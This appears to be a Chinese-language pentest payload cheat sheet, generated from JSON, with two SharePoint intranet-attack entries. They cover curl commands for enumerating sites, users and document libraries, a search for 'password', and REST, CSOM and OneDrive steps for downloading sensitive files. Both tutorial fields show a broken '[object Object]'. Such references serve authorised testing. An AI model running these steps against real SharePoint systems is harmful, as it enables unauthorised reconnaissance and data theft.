# SharePoint攻击 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（2 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. SharePoint枚举

- **id:** `sharepoint-enum`
- **分类:** SharePoint攻击 / 枚举
- **tags:** `sharepoint` `enum` `recon`

枚举SharePoint站点和文件

**前置条件**

- SharePoint可访问

**利用步骤**

#### 站点枚举

```
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点
```

枚举站点

> platform: `linux`

#### 用户枚举

```
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表
```

枚举用户

> platform: `linux`

#### 文件枚举

```
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表
```

枚举文档库

> platform: `linux`

#### 搜索文件

```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
搜索敏感文件
```

搜索敏感内容

> platform: `linux`

**教程**

[object Object]

---

### 2. SharePoint文件访问

- **id:** `sharepoint-file-access`
- **分类:** SharePoint攻击 / 文件访问
- **tags:** `sharepoint` `file` `access`

访问SharePoint文档库中的文件

**前置条件**

- SharePoint凭证或漏洞

**利用步骤**

#### Web界面访问

```
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件
```

Web界面访问

#### REST API访问

```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容
```

REST API访问

| 片段 | 说明 | 类型 |
|---|---|---|
| `_api/web/lists` | REST API端点 | keyword |
| `getbytitle` | 按名称获取列表 | keyword |

> platform: `linux`

#### CSOM访问

```
使用SharePoint客户端对象模型:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

CSOM访问

> platform: `windows`

#### OneDrive同步

```
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据
```

OneDrive同步

**教程**

[object Object]
